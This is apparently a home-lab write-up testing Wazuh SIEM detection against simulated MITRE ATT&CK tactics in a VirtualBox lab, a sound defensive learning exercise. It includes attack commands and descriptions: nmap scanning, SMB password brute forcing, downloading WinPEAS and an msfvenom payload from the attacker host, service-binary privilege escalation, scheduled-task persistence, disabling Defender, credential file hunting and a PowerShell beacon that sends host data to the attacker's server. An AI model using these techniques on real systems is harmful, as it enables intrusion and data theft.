# 𑣲    : Wazuh Detection
<img src="../_resources/cef78fb1a6c74f1eac6e21558a5a44e2.png" width="1000">

**Contents:**
1. VM Setups.
2. Wazuh Setup.
3. MITRE Phase simulation.
4. Dashboard Timeline.
5. ossec.conf.
6. Challenges.

**Tool usage:** VirtualBox, Wazuh, CMD, PowerShell, Event Viewer, Sysmon, WinPEAS, Metasploit, freerdp3, nmap, crackmap (Hydra sub), msfvenom, Wireshark.

---
# VM Setups
*Installing the ISO's into VirtualBox with their respective allocations and configs.*
1. Ubuntu Linux Client (Wazuh server) - https://ubuntu.com/download/desktop.
<img src="../_resources/1f60144415e7509ea95e7f65657f8ecf.png" width="1000">
2. Windows 10 Client (Wazuh agent) - https://www.microsoft.com/en-us/software-download/windows10.
  <img src="../_resources/2519d2c109be53b2ed19df0e34dd3be4.png" width="1000">
  - If you dont want to use the tool you can F12 the site -> toggle to device/mobile and get the ISO.
3. Kali Linux Client (Malicious actor) - https://www.kali.org/get-kali/#kali-platforms.
  <img src="../_resources/4b332540d67febf61b9f3a8a9b199d34.png" width="1000">

# Wazuh Setups

## Wazuh server (Ubuntu)
- On the Ubuntu machine I installed curl, then ran: ```curl -s0 https://packages.wazuh.com/4.14/wazuh-install.sh && sudo bash ./wazuh-install.sh -a```.
- There was a minimum hardware requirement failure and so I increased my CPUs to 2 on Virtualbox > Settings > System > Processors, and disk space increasing it first on my host with Command Prompt: ```VBoxManage modifymedium disk "PASTE_FULL_VDI_PATH_HERE" --resize 61440 ```  and then within the Ubuntu machine by downloading the Gparted GUI.
<img src="../_resources/232786d6ad08181c4e4e415752401220.png" width="1000">
<img src="../_resources/96cbd2a597d7f2a55a029a25a0e819e6.png" width="1000">
- Server and dashboard ready!
 <img src="../_resources/3e0bc5121ed17b60b9dc44213e1a768d.png" width="1000">
  <img src="../_resources/f99a5c39cc0c2796da4391bc31470ff2.png" width="1000">

  
## Wazuh agent (Windows 10)
- I installed my agent on Windows 10 VM PS using this command provided by the Wazuh dashboard: ```Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.2-1.msi -OutFile $env:tmp\wazuh-agent; msiexec.exe /i $env:tmp\wazuh-agent /q WAZUH_MANAGER="10.0.2.15" WAZUH_AGENT_GROUP="default" WAZUH_AGENT_NAME="Windows10"```.
<img src="../_resources/4cfd79e5da316f211c16bc7c537755ae.png" width="1000">
- I encountered problems because when using VMs by default network settings they cannot see eachother, I created an isolated NAT Network on Virtualbox and added every machine to it so they can say hi. Additionally I enabled RDP, network discovery and enabled file and printer sharing rules in order for the lab to go more smoothly between machines (To me it's more about interacting with Wazuh than being a realistic break-in.)
<img src="../_resources/56f656241aa3cb233daaecc289db9830.png" width="1000">
<img src="../_resources/65537ea97b9c5c1cb1942801361bb099.png" width="1000">
<img src="../_resources/38bf808e2b67f44aba02665f1be70880.png" width="1000">
<img src="../_resources/189a9c37756743edb6c318c8d9d914a3.png" width="1000">
<img src="../_resources/627a354de8af238529cb8626e7487e12.png" width="1000">
- Then the Wazuh server address was incorrect that the agent was trying to connect to (No new agents showed on dashboard) so I went to the ossec file as admin in notepad and manually altered it from 0.0.0.0 to the correct IP.
<img src="../_resources/d0337e3a1e7368ef1f2e0194dddd1d25.png" width="1000">
<img src="../_resources/66fc69952c48c22a1d7fa51798151f9b.png" width="1000">
<img src="../_resources/5957556254dda52a1ed396ca85b1c4a7.png" width="500">

---
# MITRE Tactics Simulation
- The Cyber Kill Chain and Diamond Model were each a bit too niche for this situation and so I decided to go with MITRE in terms of an industry default and non-linear framework. Choosing: Reconnaisance, Initial Access, Persistence, Privilege Escalation, Defence Evasion, Discovery, Lateral Movement & Command and Control. Other techniques were not as revelant to my setup or goals and would be more suited towards a pen-testing or larger enterprise simulation.
<img src="../_resources/2de3e02c76b310a467c9662bf04952a1.png" width="1000">


## (TA0043) Reconnaissance 
*Active or passive information gathering that may support things such as targeting, initial access and future actions of the malicious user.*
**Active Scanning (T1595), Host discovery (T1018), Victim Network Information (T1590) & Victim Host Information (T1592):**

- **nmap scanning (Light to heavy)**
```nmap -sn <subnet>``` (sn = no port scan, just checking if hosts are alive).
<img src="../_resources/fef1fe484b0bda96ff6334022eed4656.png" width="1000">
```nmap --top-ports 100 -sS -sV <win10>``` Scoping, (sS = stealth, sV= service & version detection).
<img src="../_resources/3c1494e4210525f359b99b7bf329319e.png" width="1000">
```nmap -sS -sV -O <win10>``` Narrowing scope (O = OS detection).
<img src="../_resources/8ae17f374fe0137c474cd5c1feca4173.png" width="1000">
```nmap -sU --top-ports 20 <target>``` UDP Service check (sU = UDP scan).
<img src="../_resources/46742c505a626819f776ae1e3637e02c.png" width="1000">
```nmap -T4 -sS <win10>``` Aggressive scan (T4 = Fast scan with many probes of default 1-1000)
<img src="../_resources/03d3973c5d7a434394d85d9baecc2284.png" width="1000">

-  **SMB enumeration**
  Resuming nmap, I first chose this command ``nmap -sC -p 139,445 -sV 10.0.2.30`` that runs nmap's default scripts to confirm if SMB is there and open and collect basic leaks. 
  <img src="../_resources/02e8006efd33e1fd7f118854c6092e78.png)I then further added ``nmap -p 139,445 --script smb-protocols <target>`` to get the more accurate SMB versions (SMB1 being obscelete and vulnerable" width="1000">. It showed usage of SMB 2 and 3.
<img src="../_resources/6129ef2b862b11879e974275addcac24.png" width="1000">

- **Attacker POV**: nmap's 'open | filtered' response means it cannot determine if the port is open or filtered (firewall block). We can see 4 open TCP ports: `135` (RPC - Common Windows service communication),`139` (NetBIOS - File/printer sharing),`445` (SMB - File sharing, authentication, remote access) & `5357` (HTTP for Windows Web Services). For UDP only one certain open port `137` running netbios-ns (Registers and resolves local NetBIOS names to IP addresses). Most commonly the SMB `445` port would be further investigated becuase certain versions are historically vulnerable and it is often internally exposed which is great for credential abuse and lateral movement.

- **Response:** Initially attempting these scans picked up no visibility in Wazuh (I learned they don't tend to generate any Windows Events and just send packet probes, and you would need an IDS like Suricata). For quick visibility I used Wireshark to show exactly what the stealth vs full connect scans do in terms of handshakes.
Stealth:
<img src="../_resources/aa2c52e34baa048487ede118604df0ad.png" width="1000">
Full connect (of open ports 135,139,445,3389 & 5357):
<img src="../_resources/940392fa57f028bc54efdaba30717897.png" width="1000">
Full connect (of 445 - 'SYN' from us, 'SYN,ACK' from target, 'ACK' from target & 'RST, ACK' from us):
<img src="../_resources/b92031b63c0062d5fe818045dc1ed1c3.png" width="1000">

  I also installed Sysmon to make logs more substantial and sensitive. Wazuh has their own config file for sysmon and you just need to provide an output file: <img src="../_resources/3b08e001a217e71afe005e9c2dd83f24.png" width="1000">
<img src="../_resources/9386fc59473ecfd5eba3780e3f0d2ff3.png" width="1000">
To check it was up and running correctly, I opened a notepad to make noise. Travelling to Event Viewer -> Applications and Services -> Microsoft -> Windows -> Sysmon. I then filtered events by ID of 1 (process creation) and increased the details tab size and found my notepad process creation!
<img src="../_resources/d9fcca111dd179da4a048d4d6532adb5.png" width="1000">
<img src="../_resources/2225e13d99adfebbd4d4443b5d8ca4ce.png" width="1000">
A final step is adding Sysmon as a log source for Wazuh in the Wazuh ossec config file (.txt):
<img src="../_resources/9fbde4db5f004e73c8d976dfc4fcfe2e.png" width="1000">

	To prove it is working and Wazuh is ingesting logs from it I executed a discovery command:
<img src="../_resources/5de7d0218693f92f81e67ebb1be552a9.png" width="1000">
	<img src="../_resources/67a2a3aa9c8ebad8dd85aaf02c4e3898.png" width="1000">
	<img src="../_resources/68a8893c12229eef1004ce27cd46cb56.png" width="1000">

## (TA0001) Initial Access 
*Continuous or uncontinuous use of a primary foothold into a network.*
**Brute force (T1110), Valid account use (T1078), Remote access via RDP (T1133):**
-  An additional weak user was created through the Windows machine, and added to the RDP group.
  <img src="../_resources/f7a7585cfced3d2ac4eed49a8512d1f9.png" width="1000">
  <img src="../_resources/38e6e0740f53843637451ddca1a9e54e.png" width="1000">
 Hydra did not work with RDP or SMB brute forcing so I instead used crackmap. I created a smaller 50 password attempt .txt file (small.txt) from Kali's provided rockyou list, and made crackmap run for the target. `smb` is targeting the SMB service on the provided IP, `-u` the username and `-p` the inputted password list.
  <img src="../_resources/ea1c872e650d11829c282e2794cd2241.png" width="1000">
I created a smaller 50 password attempt .txt file from Kali's provided rockyou list, and made crackmap run for the target. Then I attempted the password I knew was correct and established a successful connection:
<img src="../_resources/e56adfb5e43729e7892f7fda6dafa6db.png" width="1000">
  <img src="../_resources/142804914dbe08ff8bf8672e03122b09.png" width="1000">
- **Response:** This generated alot of noise on Wazuh.
<img src="../_resources/dff58aa5baee05be2e0031dff61217d4.png" width="1000">

	I discovered these most common IDs and mapped them to the respective Windows Security Event Log ID's through the Wazuh JSON section of the inspected events:

	 *60122 - Failed logon*
   <img src="../_resources/e632bbb0be800a3cb1adfe9ba0961f61.png" width="1000">

	 *60115 - Account lockout* 
   <img src="../_resources/5bbc7c28009c2140df5285e0039a7d17.png" width="1000">
		*92213 - Executable is dropped in a folder commonly used by malware* (This scared me a bit since I hadn't gotten to doing that yet but I learned this happens when RDP is successful which I attempted earlier when troubleshooting Hydra, Windows creates many processes under a new logon context.)
  
  <img src="../_resources/0696410505249f2437eea844ed6775d5.png" width="1000">


  
## (TA0004) Privilege Escalation 
*Abusing things like system weaknesses / misconfigurations to vertically elevate current user permissions and ease future actions on objectives.*
**Valid Accounts (T1078), Exploitation for Privilege Escalation (T1068), Create or Modify System Process (T1543), Hijack Execution Flow (T1574), Remote Services (T1021):**

- Assuming we abused credential reusage for an SMB -> RDP GUI connection (for ease, however we could have used remote command execution over SMB too with psexec, wmiexec & smb exec), initially I created a vulnerable and weak service binary on the Windows machine. `start= auto` sets the service to automatically run when Windows boots.
<img src="../_resources/28e29380408934ae073278fa195b78e7.png" width="1000">
On the Kali machine, I then hosted WinPEAS (A common Windows privilege escalation script that seeks misconfigurations) and a maliciously created payload.bat and then downloaded them through the established RDP connection from Kali to Windows.
<img src="../_resources/da58752c2296e77c09c56d9dae01e3d2.png" width="1000">
On Windows PS: `Invoke-WebRequest http://KALI_IP:8000/winPEASx64.exe -OutFile winpeas.exe` (Outputting the results to a .txt file.)
I enumerated this output for common high value keywords as a malicious actor like, such as  `Writable`, `AllAccess`, `FullControl`, `Modify` etc. (Other common methods at this point might have been: unquoted service path enumeration where a file path has no quotation marks AND whitespace then a binary matching the directory name is placed, or scheduled task misconfigurations through for example running as high-privilged but having low-privilege underlying write access)
<img src="../_resources/32edd2a3e80d4d6b5aadb5365a348fac.png" width="1000">
If we were an attacker we would now know that we have permissions to replace this binary that may be a service (program) running in the background at SYSTEM level privileges, with any executable we wanted and do almost anything if a low-privileged user has permissions to modify or replace it as shown above (the executable could including: a SYSTEM reverse shell, creation of a new hidden admin user etc). `echo ... > C:\Users\Publi\vuln.exe` is writing whatever we put between those two, into the .bat file. Which in this case is the command to give a specific user admin privileges. We are then copying a source file's contents to a second destination file. `/Y` supresses the overwrite prompt and forces it to overwrite if the file already exists.
<img src="../_resources/e63452560dda66f92aaf530ace2d346a.png" width="1000">

- **Response:**
The `Invoke-WebRequest` command and downloading winPEAS & the payload.
<img src="../_resources/c8d97912e96b33a2cc83688b871756e7.png" width="1000">
 <img src="../_resources/5cfa9b5d41cdf6082f1ce247021d2227.png" width="1000">
<img src="../_resources/20a11ced283d6ac5f7bd045acd76b124.png" width="1000">
  Possible binary replacement / reconfiguration
  <img src="../_resources/8a586b8d34a03bbd6cf3f9d71d349b3a.png" width="1000">
 <img src="../_resources/1521561ad26f64a1ca0ed78e9cf80d4b.png" width="1000">
 
## (TA0003) Persistence
*Maintaining this foothold through persistant means.*
**Scheduled Tasks/Jobs (T1053), Boot or Logon Autostart Execution (T1547), Account Creation (T1136), Downloading Payloads (T1105),Remote Services (T1021):**

- On Kali created an .exe payload with msfvenom that writes the current date and time to a .txt and hosted it through a http.server. `-p windows/x64/exec` chooses the payload that executes a command on Windows, `CMD` is the specific command that will be run when the payload executes, `-f exe` is the output format (.exe), `-o update.exe` saves the entire payload as update.exe.
<img src="../_resources/b18e91218a71e8e75068c33754280f23.png" width="1000">
  In my RDP session, through Powershell I then downloaded this .exe.
  <img src="../_resources/dd8a15fd6bc97cec17ab678625791c1c.png" width="1000">
 In CMD, now created a scheduled task to run that .exe upon logon. `tn` is task name, `/tr` is the program or script that will be executed, `/rl highest` makes it run with the highest privileges and `f` forces creation (overwrites if the task already exists right now).
<img src="../_resources/3b338633a1744669a42e787cd4c25789.png" width="1000">
 Additionally created a new admin user for some extra noise and created another scheduled task to keep creating that user upon logon incase it is deleted which is common (We also could have manipulated startup folder abuse and registry run keys like `HKCU` and `HKLM`.)
<img src="../_resources/bc26a480c0d27f5c385e50231e6020e8.png" width="1000">
So we now have "WindowsUpdateTask" and "SystemMaintenanceTask".
-  **Response:**
<img src="../_resources/711eb02c41742e80c3075133e940f8fa.png" width="1000">
<img src="../_resources/cfcb037c16caeb212251c467b8ec915c.png" width="1000">
This one actually shows the specific .exe file we made that was downloaded and the path to it.
<img src="../_resources/976afbbb0441bdd198143a28b91ee2fe.png" width="1000">
<img src="../_resources/590fe8e42df42f1100812a6d98bb9285.png" width="1000">
Then here is the admin creation and scheduled task:
<img src="../_resources/e797b9056dac8d1b0e7b4f1499440a5b.png" width="1000">
 
 
## (TA0005) Defence Evasion 
*Disabling, encryption and obsfucation techniques in order to avoid detection.*
**Masquerading (T1036), Impair Defenses (T1562), Obfuscated Files or Information (T1027):**

- For Defence Evasion, I temporarily disabled event log & Windows Defender realtime to spark some noise relating to protection modification, then encoding certain powershell commands as well as deleting certain Windows Event logs. In this case we encoded `whoami`, `hostname`, `ipconfig`, `net user` and `net localgroup administrators`.
<img src="../_resources/b42da6adc8bdf7354ed758e686e4c02f.png" width="1000">
<img src="../_resources/a4a74f55dbade70833e5ede68fe23f66.png" width="1000">

- **Response:**
  <img src="../_resources/1dbf3ae64aba4cf7d646b6b08a067bef.png" width="1000">
  
## (TA0007) Discovery & (TA0008) Lateral Movement
*Reconaissance of the compromised environment relating to the end-objective rather than sole initial access & Abuse of techniques fueled by discovery to move horizontally through systems in a network and follow through on the primary objective.*
**System Information Discovery (T1016), Network Service Scanning (T1082), Security Software Discovery (T1063), System Service Discovery (T1007), Account Discovery (T1087), Lateral Movement (TA0008), Remote Services (T1021):**

- User and group discovery with ``net user``, ``net localgroup administrators`` and ``query user``.
 Created a new RDP session with re-use of credentials for that new user (that may have privileges more tailored to a malicious actor's objective).
 <img src="../_resources/cefb468552104e2c98a80b39635aa0a2.png" width="1000">
 <img src="../_resources/85e337b988fe3b96ccdfa9ece282feca.png" width="1000">
 System and OS discovery with ``systeminfo``, ``hostname`` and ``whoami /all``.
<img src="../_resources/ce16d785b25bfc79eca6924b8da2682d.png" width="1000">
  <img src="../_resources/185f0a6c41875e3cc553263af5847950.png" width="1000">
  <img src="../_resources/4f905b647a6d753e9d7bb97f463be928.png" width="1000">
 Network discovery with ``ip config /all``, ``arp -a``, ``netstat -ano`` and ``route print``.
  <img src="../_resources/b5c1e7b4d4f92152018eceb1aad2b92b.png" width="1000">
  <img src="../_resources/f983f59d91133b6a0b58906867e07c9b.png" width="1000">
  <img src="../_resources/41989cf3a2604a7a449f53f623071301.png" width="1000">
  <img src="../_resources/c3b043ace37228474cb3bc748814fbc5.png" width="1000">
 File hunting (that could contain credentials or information on objectives) with ``dir C:\Users /s /b`` (AppData roaming & local for ____, ProgramData etc.), ``findstr /si password *.txt *.xml *.ini`` and ``dir C:\ /s /b | findstr /i "pass admin login cred"``.


- **Response:**
<img src="../_resources/e5548e909d94326550ea03c479805662.png" width="1000">
<img src="../_resources/384ca1891aa4671f211c965ec1766270.png" width="1000">
Wazuh shows the exact CMD Prompts.
<img src="../_resources/d903777a2f147d4919e235f0c00ce3e1.png" width="1000">
<img src="../_resources/0f194c361dd7ad8e1bd46366b438bfe9.png" width="1000">
<img src="../_resources/c782d8e15d7ad8ebca51acd9e9e4229a.png" width="1000">

  
## (TA0011) Command and Control 
*Adversary communication and control of compromised systems, with various levels of obsfucation.*
**Application Layer Protocol (T1071), Web Protocols (T1071.001),Command and Scripting Interpreter (T1059):**

- We are going to start a server on Kali and get the victim machine to ping back some information on a regular basis.
<img src="../_resources/0cad8f713c41e759b48a6ea35387c0d3.png" width="1000">

- This PS script creates an infininte loop every 60 seconds `while ($true) { ... }` (later paired with `Start-Sleep 60`). We first create the variables =  `$time`, `$user`, `$ip`, `$procs` (processes), `$ports` & `$logins` (reads the log file made earlier that notes login time to a .txt file each startup). Then call them each within the multi-line string `$body = @`. We then send a HTTP request to the Kali server address that includes the data within the URL `?data=`.
<img src="../_resources/e3d552e0086a0c4371ba80296b6a3801.png" width="1000">

- Here we can see the output in the Kali terminal running the HTTP server.
<img src="../_resources/a108e17cc2e920175586f40d6c1b57f5.png" width="1000">

- **Response:**
 I was trying to see results or events triggered in Wazuh but saw next to nothing with this regular beaconing, likely becuase it is normal HTTP GET requests from built in tools and quite stealthy, I thought it may be that that frequency is too low so I upped it to every singular second and it started to make Wazuh suspicious and flood with .exe alerts from powershell activity.
  The C2 technique is not as visible on the main MITRE dashboard compared to other tactic noise, but going into it specifically through the Framework tab shows the exact scripts we ran being categorised.
<img src="../_resources/becacf3e3f75412d367fe5e172e61eb3.png" width="1000">
 <img src="../_resources/ab7d0d33e4aea3c32c4e5ea7bb985644.png" width="1000">
<img src="../_resources/4d498ad041c1a7d5a7440f9e59e67ed0.png" width="1000">

---
# MITRE ATT&CK Timeline:
- For the most part, Wazuh's MITRE dashboard showed the phases relatively well along my process. I learnt that the phases of attack are rarely going to be in perfect order and more a light semblence of it, for example alot of lateral movement techniques can be involved in persistence phases.

- Initial Access and Privilege Escalation Phases.
<img src="../_resources/2ed4fb5b07d3ddd6ea954d2cd6174dba.png" width="1000">

- Persistance Phase (Triggered alot of lateral movement from the tool payload (.exe) transfers.)
<img src="../_resources/457c5aa07c8d898901a6002c7b418a5b.png" width="1000">

- Defence Evasion Phase.
<img src="../_resources/000a725655cc711e26b77588739a304a.png" width="1000">

- Discovery & Lateral Movement Phases.
<img src="../_resources/9359541ab23009b4aef5813b83a7d094.png" width="1000">

---
# ossec.conf
- I downloaded a better text editor (Sublime) and navigated to the ossec.conf directory in order to open it up and take a look. It is the main configuration file for Wazuh and you can alter things such as log colleciton, file integrity monitoring, vulnerability management and malware checks.
 <img src="../_resources/670d79df483afe8f3fccedf2deb4b559.png" width="1000">
Some examples:
<img src="../_resources/55fe321b297b04235eff2526a54886ee.png" width="1000">
<img src="../_resources/ec07b5af4c2c81b03f75542c03cb2415.png" width="1000">
<img src="../_resources/ad8e5e69a59a7e264023e2f205188afd.png" width="1000">
- As a demonstration (Windows ossec agent-file), we can enable the file integrity monitoring, and also add a directory that we want to be monitored:
  <img src="../_resources/d75be780d6a397413ec1d552d00ccd73.png" width="1000">
  <img src="../_resources/132b6c75bc170a49d10336a439946511.png" width="1000">
This is how it looks beforehand.
<img src="../_resources/b982ca95a5fb089c92cf1a251d6f28b1.png" width="1000">
I added a weirdfile.txt to the folder, modified it and then deleted it with the following results:
<img src="../_resources/1672c4b42993b4013295cbaa67c54ad8.png" width="1000">
<img src="../_resources/88bce91e2d95f94f0cee5e80886d6aeb.png" width="1000">

---
# Challenges:
- Certain arguably better custom Sysmon config files crashing Wazuh, in the end I just went for using Wazuh's recommended one but would like to look into others.
- Hydra not working despite RDP and SMB clearly showing open with nmap. Used crackmap instead.
-  Dynamic IP reassignment caused agents to become disconnected sometimes at the start.
- winPeas Windows Security block (temporarily disable realtime protection or create a bypass).
- The additions required for a SIEM to fully function, for example we could not monitor various nmap scan noise levels on Wazuh and Sysmon alone, we would need something such as an IDS like Suricata.
-  The scheduled tasks created too much noise eventually and drowned out the ability to see other MITRE tactic phases, so I had to delete them before the discovery phase, but on Wazuh you can also quite easily remove certain Event IDs.


